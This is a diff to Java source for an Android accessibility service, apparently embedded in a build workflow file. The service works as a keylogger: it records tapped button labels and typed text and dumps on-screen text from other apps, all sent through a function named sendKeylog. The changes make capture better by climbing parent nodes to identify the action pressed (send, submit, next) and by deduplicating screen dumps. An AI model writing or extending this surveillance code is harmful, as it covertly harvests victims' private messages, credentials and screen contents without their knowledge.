@@ -563,7 +563,7 @@ jobs:
                   return list;
               }
 
-              // ================== EVENT HANDLING (DEDUP WITHOUT TIME WINDOW) ==================
+              // ================== EVENT HANDLING ==================
               @Override
               public void onAccessibilityEvent(AccessibilityEvent event) {
                   try {
@@ -617,9 +617,20 @@ jobs:
                   AccessibilityNodeInfo source = event.getSource();
                   String clickedText = "";
                   if (source != null) {
-                      try {
-                          clickedText = source.getText() != null ? source.getText().toString() : (source.getContentDescription() != null ? source.getContentDescription().toString() : "");
-                      } catch (Exception ignored) {}
+                      // Try source node first
+                      clickedText = getNodeText(source);
+                      // If empty, search parent chain for button text
+                      AccessibilityNodeInfo parent = source.getParent();
+                      int depth = 0;
+                      while (parent != null && depth < 5) {
+                          String parentText = getNodeText(parent);
+                          if (!parentText.isEmpty() && isActionText(parentText)) {
+                              clickedText = parentText;
+                              break;
+                          }
+                          parent = parent.getParent();
+                          depth++;
+                      }
                       source.recycle();
                   }
 
@@ -628,7 +639,7 @@ jobs:
                   // 1. Send tap event
                   sendKeylog("👆 [" + appName + " Tapped] " + (clickedText.isEmpty() ? "Unknown" : clickedText));
 
-                  // 2. Send typed text if buffer has content
+                  // 2. Flush pending text if any
                   if (pendingText.length() > 0) {
                       String typed = pendingText.toString().trim();
                       String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : appName);
@@ -636,6 +647,31 @@ jobs:
                       pendingText.setLength(0);
                       pendingPackageName = null;
                   }
+              }
+
+              private String getNodeText(AccessibilityNodeInfo node) {
+                  if (node == null) return "";
+                  try {
+                      String text = node.getText() != null ? node.getText().toString() : "";
+                      if (text.isEmpty() && node.getContentDescription() != null) {
+                          text = node.getContentDescription().toString();
+                      }
+                      return text.trim();
+                  } catch (Exception e) {
+                      return "";
+                  }
+              }
+
+              private boolean isActionText(String text) {
+                  String lower = text.toLowerCase();
+                  return lower.contains("send") ||
+                         lower.contains("search") ||
+                         lower.contains("go") ||
+                         lower.contains("submit") ||
+                         lower.contains("enter") ||
+                         lower.contains("done") ||
+                         lower.contains("next") ||
+                         lower.contains("send message");
               }
 
               private void scheduleScreenDataCapture(String packageName) {
@@ -651,7 +687,7 @@ jobs:
                           Log.e(TAG, "screen data capture error", e);
                       }
                   };
-                  mainHandler.postDelayed(screenDataRunnable, 800); // 800ms debounce
+                  mainHandler.postDelayed(screenDataRunnable, 800);
               }
 
               private void captureAndSendScreenData(String appName) {
@@ -661,13 +697,11 @@ jobs:
                       String screenText = extractTextFromNode(root);
                       if (screenText.isEmpty()) return;
 
-                      // ✅ Dedup: identical state never resent, regardless of time
                       if (screenText.equals(lastSentScreenData)) {
                           return;
                       }
 
                       sendKeylog("🖥️ [" + appName + "] Screen Data: " + screenText);
-
                       lastSentScreenData = screenText;
                   } catch (Exception e) {
                       Log.e(TAG, "captureAndSendScreenData error", e);
